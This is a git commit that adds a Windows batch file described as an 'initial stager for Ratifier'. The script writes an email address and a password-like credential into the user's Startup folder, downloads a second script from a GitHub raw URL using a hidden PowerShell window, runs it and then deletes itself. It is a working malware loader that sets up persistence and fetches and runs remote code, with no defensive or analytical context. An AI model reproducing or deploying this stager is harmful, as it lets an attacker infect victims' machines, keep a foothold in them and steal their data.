1161745dd29f6177f0668ac4c5712be6b06f0694
gozen-foto <gofoto.zen@proton.me>
2026-06-01 11:11:11 +0530

    Add files via upload

---
+++ installer/initial.cmd
@@ -0,0 +1,26 @@
+@echo off
+@REM initial stager for Ratifier
+@REM created by : gozen-fotoZ
+
+@REM credentials - CHANGE ME
+set "email=trassh.bucket@gmail.com"
+set "eword=xcsf bklk azgw mrub"
+
+@REM variables
+set "var=%cd%"
+set "startup=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+
+@REM move into startup directory
+cd %startup%
+echo %email% > email.txt
+echo %eword% > eword.txt
+
+@REM write payload to startup
+powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/wget.cmd -OutFile wget.cmd"
+
+@REM run payload
+powershell ./wget.cmd 
+
+@REM cd back into initial location
+cd %var%
+del initial.cmd
